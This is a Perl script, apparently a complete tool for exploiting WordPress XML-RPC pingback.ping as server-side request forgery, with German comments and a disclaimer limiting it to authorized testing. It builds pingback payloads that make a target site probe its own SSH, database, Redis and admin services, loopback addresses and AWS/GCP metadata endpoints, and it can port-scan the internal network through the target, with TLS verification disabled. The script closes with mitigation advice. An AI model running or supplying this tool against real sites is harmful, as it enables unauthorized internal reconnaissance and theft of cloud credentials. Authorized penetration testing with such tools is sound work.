#!/usr/bin/perl
#┌────────────────────────────────────────────────────────────────────────┐
#│                                                                        │
#│         ███████╗████████╗ ██████╗ ███████╗██████╗ ████████╗██╗         │
#│         ██╔════╝╚══██╔══╝██╔═══██╗██╔════╝██╔══██╗╚══██╔══╝██║         │
#│         ███████╗   ██║   ██║   ██║█████╗  ██████╔╝   ██║   ██║         │
#│         ╚════██║   ██║   ██║   ██║██╔══╝  ██╔══██╗   ██║   ██║         │
#│         ███████║   ██║   ╚██████╔╝███████╗██║  ██║   ██║   ██║         │
#│         ╚══════╝   ╚═╝    ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚═╝         │
#│                                                                        │
#│                    "old school, still root"                            │
#│                    "stoerti - the jobless hacker"                      │
#│                                                                        │
#│    ┌──────────────────────────────────────────────────────────────┐    │
#│    │  40 years in the trenches.     │  6 months unemployed in DE. │    │
#│    │  They fired the one who knew.  │  This is my legacy.         │    │
#│    │                   -- no patches for reality --               │    │
#│    └──────────────────────────────────────────────────────────────┘    │
#│                                                                        │
#└────────────────────────────────────────────────────────────────────────┘
# MIT License
#
# Copyright (c) 2026 Klaus Baumdick
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

# ============================================================================
# DISCLAIMER
# ============================================================================
#
# This script is intended solely for educational purposes and authorized
# penetration testing in controlled environments.
#
# Unauthorized use of this script against systems without explicit written
# permission is illegal and may result in criminal or civil liability.
#
# The author assumes no responsibility for any misuse, damages, or legal
# consequences arising from the use of this script.
#
# USE AT YOUR OWN RISK.
# ============================================================================
use strict;
use warnings;
use LWP::UserAgent;
use Time::HiRes qw(time);
use Getopt::Long;
use IO::Socket::INET;
use Term::ANSIColor qw(:constants);
use JSON::PP;
use HTTP::Request;
use HTTP::Response;
use URI::Escape;
use MIME::Base64;

# ======================================================================
# WORDPRESS XML-RPC SSRF TESTER
# ======================================================================
# Autor:  Klaus Baumdick (stoerti) aka "The jobless hacker"
# Zweck:  Testet ob WordPress pingback.ping für SSRF anfällig ist
# Version: 2.0
# Lizenz: CC BY-NC-ND 4.0
# ======================================================================
# Nur für autorisierte Sicherheitstests!
# ======================================================================
# Port-Scan mit benutzerdefiniertem Bereich
# perl wp-ssrf.pl --url https://example.com --scanports --port-range 1-1000

# Mit JSON-Output für Reports
# perl wp-ssrf.pl --url https://example.com --output scan.json --verbose

# Mit Authentifizierung
# perl wp-ssrf.pl --url https://example.com --auth admin --auth-pass geheim

# Cloud-Metadata testen
# perl wp-ssrf.pl --url https://example.com --targetip 169.254.169.254


# Farben für bessere Lesbarkeit
my $GREEN = GREEN;
my $RED = RED;
my $YELLOW = YELLOW;
my $CYAN = CYAN;
my $RESET = RESET;

# ======================================================================
# KONFIGURATION
# ======================================================================
my %config = (
    target_url   => '',
    xmlrpc_path  => '/xmlrpc.php',
    test_url     => '',
    target_ip    => '',
    scan_ports   => 0,
    timeout      => 10,
    verbose      => 0,
    quiet        => 0,
    output_json  => '',
    user_agent   => 'Mozilla/5.0 (WordPress SSRF Tester)',
    delay        => 1,
    max_redirect => 0,
    max_requests => 10,
    auth_user    => '',
    auth_pass    => '',
    cookie       => '',
    follow_redirects => 0,
    port_range   => '1-1024',
);

# ======================================================================
# KOMMANDOZEILENOPTIONEN
# ======================================================================
GetOptions(
    'url=s'           => \$config{target_url},
    'xmlrpc=s'        => \$config{xmlrpc_path},
    'testurl=s'       => \$config{test_url},
    'targetip=s'      => \$config{target_ip},
    'scanports!'      => \$config{scan_ports},
    'timeout=i'       => \$config{timeout},
    'verbose'         => \$config{verbose},
    'quiet'           => \$config{quiet},
    'output=s'        => \$config{output_json},
    'user-agent=s'    => \$config{user_agent},
    'delay=i'         => \$config{delay},
    'max-requests=i'  => \$config{max_requests},
    'auth=s'          => \$config{auth_user},
    'auth-pass=s'     => \$config{auth_pass},
    'cookie=s'        => \$config{cookie},
    'follow-redirects'=> \$config{follow_redirects},
    'port-range=s'    => \$config{port_range},
    'help'            => sub { print_help(); exit 0; }
) or die "❌ Fehler in Optionen. Verwende --help\n";

# ======================================================================
# VALIDIERUNG
# ======================================================================
validate_config();

# ======================================================================
# INITIALISIERUNG
# ======================================================================
my $start_time = time();
my $full_xmlrpc_url = $config{target_url} . $config{xmlrpc_path};
my @results = ();

# Ziel-IP ermitteln falls nicht angegeben
if (!$config{target_ip}) {
    ($config{target_ip}) = $config{target_url} =~ m|https?://([^:/]+)|;
    print_info("Ziel-IP aus URL extrahiert: $config{target_ip}");
}

show_banner();
print_info("Ziel: $full_xmlrpc_url");
print_info("Ziel-IP: $config{target_ip}");
print_info("Timeout: $config{timeout} Sekunden");

# ======================================================================
# 1. PRÜFEN OB XML-RPC AKTIV IST
# ======================================================================
print_section("XML-RPC TEST");

my $ua = create_user_agent();
my $test_response = $ua->get($full_xmlrpc_url);

if (!$test_response->is_success && $test_response->code != 405) {
    print_error("XML-RPC nicht erreichbar (HTTP " . $test_response->code . ")");
    print_tip("Prüfe URL und Pfad: $full_xmlrpc_url");
    exit 1;
}

print_success("XML-RPC-Endpunkt erreichbar");

# ======================================================================
# 2. METHODEN LISTEN
# ======================================================================
print_section("XML-RPC METHODEN");

my $methods = get_xmlrpc_methods($ua, $full_xmlrpc_url);
my $has_pingback = 0;

if ($methods && @$methods > 0) {
    print_info("Gefundene Methoden: " . scalar(@$methods));

    # Interessante Methoden hervorheben
    my @interesting_methods = grep {
        $_ =~ /pingback|system|demo|wp\.|metaWeblog|blogger/
    } @$methods;

    if (@interesting_methods > 0) {
        print_success("Interessante Methoden:");
        foreach my $method (@interesting_methods) {
            my $highlight = $method eq 'pingback.ping' ? "$GREEN$method$RESET" : $method;
            print "  • $highlight\n";
        }
    }

    if (grep { $_ eq 'pingback.ping' } @$methods) {
        print_success("✅ pingback.ping ist verfügbar - SSRF-Test möglich");
        $has_pingback = 1;
    } else {
        print_warning("pingback.ping nicht gefunden");
    }
}

if (!$has_pingback && !$config{scan_ports}) {
    print_warning("Keine SSRF-Methode gefunden. Abbruch.");
    print_tip("Mit --scanports trotzdem Port-Scan versuchen?");
    exit 0;
}

# ======================================================================
# 3. GÜLTIGE POST-ID FINDEN
# ======================================================================
my $post_id = find_post_id($config{target_url});
print_info("Verwende Post-ID: $post_id");

# ======================================================================
# 4. SSRF-TESTS VORBEREITEN
# ======================================================================
print_section("SSRF-TESTS");

my @test_urls = ();

# Externer Test (dein Server)
if ($config{test_url}) {
    push @test_urls, {
        name => "Externer Request",
        url => $config{test_url},
        type => 'external',
        description => "Prüft ob Server nach extern senden kann"
    };
}

# Interne Dienste auf dem Zielserver
push @test_urls, (
    { name => "HTTP (Port 80)",      url => "http://$config{target_ip}:80/",        type => 'internal', description => "Webserver" },
    { name => "HTTPS (Port 443)",    url => "https://$config{target_ip}:443/",      type => 'internal', description => "Webserver (SSL)" },
    { name => "SSH (Port 22)",       url => "http://$config{target_ip}:22/",        type => 'internal', description => "SSH-Dienst" },
    { name => "MySQL (Port 3306)",   url => "http://$config{target_ip}:3306/",      type => 'internal', description => "Datenbank" },
    { name => "PostgreSQL (5432)",   url => "http://$config{target_ip}:5432/",      type => 'internal', description => "PostgreSQL" },
    { name => "Redis (6379)",        url => "http://$config{target_ip}:6379/",      type => 'internal', description => "Redis" },
    { name => "Adminer/phpMyAdmin",  url => "http://$config{target_ip}/phpmyadmin/", type => 'internal', description => "Datenbank-Admin" },
    { name => "WordPress Admin",     url => "http://$config{target_ip}/wp-admin/",  type => 'internal', description => "Admin-Bereich" },
    { name => "Server Localhost",    url => "http://127.0.0.1:80/",                 type => 'internal', description => "Loopback-Interface" },
    { name => "IPv6 Localhost",      url => "http://[::1]:80/",                     type => 'internal', description => "IPv6 Loopback" },
    { name => "Metadata (AWS)",      url => "http://169.254.169.254/latest/meta-data/", type => 'cloud', description => "AWS Metadata" },
    { name => "Metadata (GCP)",      url => "http://metadata.google.internal/",      type => 'cloud', description => "GCP Metadata" },
);

# ======================================================================
# 5. PORT-SAN (OPTIONAL)
# ======================================================================
if ($config{scan_ports}) {
    print_section("PORT-SCAN");

    my @ports = parse_port_range($config{port_range});
    print_info("Scanne Ports: " . join(', ', @ports));

    foreach my $port (@ports) {
        push @test_urls, {
            name => "Port $port Scan",
            url => "http://$config{target_ip}:$port/",
            type => 'portscan',
            description => "Prüft ob Port $port offen ist"
        };
    }
}

# ======================================================================
# 6. TESTS DURCHFÜHREN
# ======================================================================
my $found_ssrf = 0;
my $test_count = 0;

foreach my $test (@test_urls) {
    $test_count++;
    last if $test_count > $config{max_requests};

    print "\n[$test_count/$config{max_requests}] Teste: $test->{name}\n";
    print_info("URL: $test->{url}");

    my $result = run_pingback_test($ua, $test, $post_id);
    push @results, $result;

    if ($result->{ssrf_success}) {
        $found_ssrf++;
    }

    # Kurze Pause zwischen Tests
    sleep($config{delay}) if $config{delay} > 0;
}

# ======================================================================
# 7. ERGEBNISSE ANZEIGEN
# ======================================================================
print_section("ERGEBNISSE");

show_results_summary(\@results, $found_ssrf);

# ======================================================================
# 8. JSON-OUTPUT
# ======================================================================
if ($config{output_json}) {
    save_json_output(\@results, $found_ssrf);
}

# ======================================================================
# 9. EMPFEHLUNGEN
# ======================================================================
print_recommendations($found_ssrf);

# ======================================================================
# ABSCHLUSS
# ======================================================================
my $total_time = time() - $start_time;
print_info(sprintf("Gesamtzeit: %.2f Sekunden", $total_time));

exit($found_ssrf ? 2 : 0);

# ======================================================================
# HILFSFUNKTIONEN
# ======================================================================

sub validate_config {
    if (!$config{target_url}) {
        print_error("Keine Ziel-URL angegeben");
        print "Verwendung: $0 --url https://example.com [Optionen]\n";
        print "Verwende --help für ausführliche Hilfe.\n";
        exit 1;
    }

    # URL normalisieren
    $config{target_url} =~ s/\/$//;

    if ($config{target_url} !~ /^https?:\/\//) {
        $config{target_url} = 'https://' . $config{target_url};
        print_warning("URL zu https:// ergänzt");
    }

    if ($config{max_requests} > 100) {
        print_warning("max-requests sehr hoch ($config{max_requests})");
        print "Fortfahren? (j/N): ";
        my $answer = <STDIN>;
        chomp $answer;
        exit 0 unless $answer =~ /^j/i;
    }
}

sub create_user_agent {
    my $ua = LWP::UserAgent->new(
        timeout => $config{timeout},
        agent => $config{user_agent},
        max_size => 1024 * 1024 * 10,  # 10 MB Max
        keep_alive => 0,
        max_redirect => $config{follow_redirects} ? 5 : 0,
        cookie_jar => {},
    );

    # SSL-Optionen
    $ua->ssl_opts(
        verify_hostname => 0,
        SSL_verify_mode => 0,
    );

    # Basic Auth falls angegeben
    if ($config{auth_user} && $config{auth_pass}) {
        $ua->credentials(
            $config{target_url},
            '',
            $config{auth_user},
            $config{auth_pass}
        );
    }

    # Custom Headers
    push @{$ua->requests_redirectable}, 'POST';

    return $ua;
}

sub get_xmlrpc_methods {
    my ($ua, $url) = @_;

    my $xml = '<?xml version="1.0"?>
<methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
</methodCall>';

    my $resp = $ua->post($url,
        'Content-Type' => 'text/xml',
        'Content' => $xml
    );

    if ($resp->is_success) {
        my @methods = $resp->content =~ /<string>(.*?)<\/string>/g;
        return \@methods;
    }

    return [];
}

sub find_post_id {
    my ($url) = @_;

    # Versuche Post-ID aus der Hauptseite zu extrahieren
    my $ua = LWP::UserAgent->new(timeout => 5);
    my $resp = $ua->get($url);

    if ($resp->is_success) {
        # Suche nach verschiedenen Pattern
        if ($resp->content =~ /\?p=(\d+)/) {
            return $1;
        }
        if ($resp->content =~ /post-(\d+)/) {
            return $1;
        }
        if ($resp->content =~ /entry id="post-(\d+)"/) {
            return $1;
        }
    }

    # Fallback: Verwende ID 1
    return 1;
}

sub run_pingback_test {
    my ($ua, $test, $post_id) = @_;

    my $result = {
        test_name => $test->{name},
        url => $test->{url},
        type => $test->{type},
        timestamp => scalar(localtime()),
        ssrf_success => 0,
        warnings => [],
        details => {},
    };

    # XML-Payload für pingback.ping
    my $pingback_xml = '<?xml version="1.0"?>
<methodCall>
    <methodName>pingback.ping</methodName>
    <params>
        <param>
            <value>
                <string>' . $test->{url} . '</string>
            </value>
        </param>
        <param>
            <value>
                <string>' . $config{target_url} . '/?p=' . $post_id . '</string>
            </value>
        </param>
    </params>
</methodCall>';

    $result->{payload_size} = length($pingback_xml);

    # Request senden
    my $start = time();
    my $resp;
    my $timeout_occurred = 0;

    eval {
        local $SIG{ALRM} = sub { die "timeout\n"; };
        alarm($config{timeout} + 5);
        $resp = $ua->post($full_xmlrpc_url,
            'Content-Type' => 'text/xml',
            'Content' => $pingback_xml
        );
        alarm(0);
    };

    $result->{duration} = time() - $start;

    if ($@ && $@ =~ /timeout/) {
        $timeout_occurred = 1;
        $result->{status} = 'timeout';
        push @{$result->{warnings}}, "Timeout nach $result->{duration}s";
        print_warning(sprintf("TIMEOUT nach %.2f Sekunden", $result->{duration}));
        return $result;
    }

    $result->{status} = $resp->code;
    $result->{success} = $resp->is_success ? 1 : 0;

    print_success(sprintf("Antwortzeit: %.3f Sekunden", $result->{duration}));
    print_info("HTTP-Status: " . $resp->code);

    # Antwort analysieren
    my $content = $resp->content;
    $result->{response_size} = length($content);

    if ($resp->is_success) {
        # XML parsen
        if ($content =~ /<string>(.*?)<\/string>/) {
            my $msg = $1;
            $result->{response_message} = $msg;
            print_info("Antwort: $msg");

            if ($msg =~ /(registered|accepted|success|pingback already registered)/i) {
                $result->{ssrf_success} = 1;
                push @{$result->{warnings}}, "SSRF erfolgreich: $msg";
                print_warning("✅ SSRF wahrscheinlich erfolgreich!");
            }

            # Fault-Codes erkennen
            if ($msg =~ /faultCode/i) {
                $result->{fault} = 1;
                print_info("Fehlercode: $msg");
            }
        }

        # Detaillierte Ausgabe bei verbose
        if ($config{verbose} && $content =~ /<value>(.*?)<\/value>/s) {
            my $data = $1;
            $data =~ s/<!\[CDATA\[(.*?)\]\]>/$1/g;
            $data =~ s/\n/ /g;
            $data =~ s/\s+/ /g;
            print_info("Details: " . substr($data, 0, 200));
        }
    }
    elsif ($resp->code == 500) {
        push @{$result->{warnings}}, "HTTP 500 - Server hat Request vielleicht ausgeführt";
        print_warning("HTTP 500 - Möglicherweise SSRF erfolgreich");
    }

    return $result;
}

sub parse_port_range {
    my ($range) = @_;

    if ($range =~ /^(\d+)$/) {
        return ($1);
    }
    elsif ($range =~ /^(\d+)-(\d+)$/) {
        my ($start, $end) = ($1, $2);
        return ($start..$end);
    }
    elsif ($range =~ /^(\d+),(\d+)$/) {
        return ($1, $2);
    }

    # Default: häufige Ports
    return (21,22,25,80,443,3306,5432,6379,8080,8443,9200,27017);
}

sub show_results_summary {
    my ($results, $vuln_count) = @_;

    my $total = scalar(@$results);
    my $successful = grep { $_->{ssrf_success} } @$results;
    my $timeouts = grep { $_->{status} eq 'timeout' } @$results;

    print_info("Tests gesamt: $total");
    print_info("SSRF-Erfolge: $successful");
    print_info("Timeouts: $timeouts");

    if ($vuln_count > 0) {
        print_color("$RED❗ KRITISCHE SCHWACHSTELLE: $vuln_count SSRF-Erfolge$RESET");
        print "\nDer Server führt unvalidierte HTTP-Requests durch und ist anfällig für:\n";
        print "  • Auslesen interner Dienste\n";
        print "  • Zugriff auf Admin-Bereiche\n";
        print "  • Port-Scans des internen Netzwerks\n";
        print "  • Zugriff auf Cloud-Metadata (AWS/GCP)\n";
    } else {
        print_success("Keine SSRF-Schwachstelle gefunden");
        print "Die pingback.ping-Methode scheint entweder deaktiviert oder gefiltert.\n";
    }
}

sub save_json_output {
    my ($results, $vuln_count) = @_;

    my $output = {
        tool => "WordPress XML-RPC SSRF Tester",
        version => "2.0",
        timestamp => scalar(localtime()),
        unix_time => time(),
        target => $full_xmlrpc_url,
        target_ip => $config{target_ip},
        config => \%config,
        results => $results,
        statistics => {
            total_tests => scalar(@$results),
            ssrf_success => scalar(grep { $_->{ssrf_success} } @$results),
            timeouts => scalar(grep { $_->{status} eq 'timeout' } @$results),
        },
        vulnerability_found => $vuln_count ? JSON::PP::true : JSON::PP::false,
        severity => $vuln_count > 0 ? "CRITICAL" : "NONE",
        total_time => time() - $start_time,
        recommendations => get_recommendations_array($vuln_count),
    };

    my $json = JSON::PP->new->pretty->encode($output);

    open(my $fh, '>', $config{output_json}) or die "Kann Datei nicht öffnen: $!";
    print $fh $json;
    close($fh);

    print_success("Ergebnisse gespeichert: $config{output_json}");
}

sub get_recommendations_array {
    my ($vuln_found) = @_;
    my @recs = (
        "XML-RPC komplett deaktivieren: <Files xmlrpc.php> Require all denied </Files>",
        "pingback.ping deaktivieren via Filter: unset( \$methods['pingback.ping'] )",
        "WordPress und Plugins aktuell halten",
        "Webserver-Firewall konfigurieren",
        "Netzwerksegmentierung für interne Dienste"
    );

    if ($vuln_found) {
        unshift @recs, "🔴 SOFORT MASSNAHMEN ERFORDERLICH! Server ist kompromittierbar";
    }

    return \@recs;
}

sub print_recommendations {
    my ($vuln_found) = @_;

    print_section("EMPFEHLUNGEN");

    my @recommendations = (
        "• XML-RPC komplett deaktivieren:",
        "  <Files xmlrpc.php>",
        "      Require all denied",
        "  </Files>",
        "",
        "• Oder nur pingback.ping deaktivieren:",
        "  add_filter( 'xmlrpc_methods', function( \$methods ) {",
        "      unset( \$methods['pingback.ping'] );",
        "      return \$methods;",
        "  } );",
        "",
        "• WordPress auf dem neuesten Stand halten",
        "• Web Application Firewall (WAF) einsetzen",
        "• Netzwerksegmentierung für interne Dienste",
    );

    if ($vuln_found) {
        print_color("$RED🔴 SOFORT MASSNAHMEN ERFORDERLICH!$RESET");
        print "Server ist durch SSRF gefährdet!\n\n";
    }

    foreach (@recommendations) {
        print "$_\n";
    }
}

sub print_help {
    print <<"HELP";
================================================================================
WORDPRESS XML-RPC SSRF TESTER v2.0
================================================================================

BESCHREIBUNG:
  Testet ob WordPress' pingback.ping Methode für Server-Side Request Forgery
  (SSRF) anfällig ist. Kann interne Dienste und Cloud-Metadata auslesen.

VERWENDUNG:
  $0 --url <wordpress-url> [Optionen]

ERFORDERLICH:
  --url URL        WordPress-URL (z.B. https://example.com)

OPTIONEN:
  --xmlrpc PATH    Pfad zu xmlrpc.php (Default: /xmlrpc.php)
  --testurl URL    Deine externe Test-URL für Callback-Tests
  --targetip IP    IP-Adresse des Zielservers (Default: aus URL)
  --scanports      Führe Port-Scan durch
  --port-range R   Port-Bereich für Scan (z.B. "1-1000" oder "80,443,3306")

  --timeout N      Timeout in Sekunden (Default: 10)
  --delay N        Pause zwischen Tests (Default: 1)
  --max-requests N Maximale Anzahl Requests (Default: 10)

  --auth USER      Basic Auth Benutzername
  --auth-pass PASS Basic Auth Passwort
  --cookie COOKIE  Session-Cookie
  --user-agent UA  Eigenen User-Agent verwenden

  --verbose        Ausführliche Ausgabe
  --quiet          Minimale Ausgabe
  --output DATEI   Ergebnisse als JSON speichern
  --follow-redirects  Redirects folgen
  --help           Diese Hilfe anzeigen

BEISPIELE:
  # Einfacher Test
  $0 --url https://example.com

  # Mit externem Callback-Server
  $0 --url https://wordpress-site.de --testurl http://dein-server.com:8080

  # Port-Scan des internen Netzwerks
  $0 --url https://target.com --targetip 192.168.1.100 --scanports

  # Ausführlicher Test mit JSON-Output
  $0 --url https://example.com --verbose --output ergebnis.json

HINWEISE:
  • Nur auf eigenen oder autorisierten Systemen testen!
  • SSRF kann zu vollständiger Kompromittierung führen
  • Cloud-Metadata (169.254.169.254) enthält oft Zugangsdaten
  • CC BY-NC-ND 4.0 Lizenz - Nur für Bildungszwecke

================================================================================
HELP
    exit 0;
}

sub show_banner {
    print <<"BANNER";
$CYAN================================================================================
WORDPRESS XML-RPC SSRF TESTER v2.0
================================================================================$RESET
BANNER
}

sub print_section {
    my ($title) = @_;
    print "\n$CYAN▶ $title$RESET\n";
    print "-" x 40 . "\n";
}

sub print_success {
    my ($msg) = @_;
    print "$GREEN✓ $msg$RESET\n" unless $config{quiet};
}

sub print_error {
    my ($msg) = @_;
    print "$RED❌ $msg$RESET\n";
}

sub print_warning {
    my ($msg) = @_;
    print "$YELLOW⚠️  $msg$RESET\n";
}

sub print_info {
    my ($msg) = @_;
    print "  $msg\n" if $config{verbose} && !$config{quiet};
}

sub print_tip {
    my ($msg) = @_;
    print "  💡 $msg\n" if !$config{quiet};
}

sub print_color {
    my ($msg) = @_;
    print "$msg\n";
}

__END__
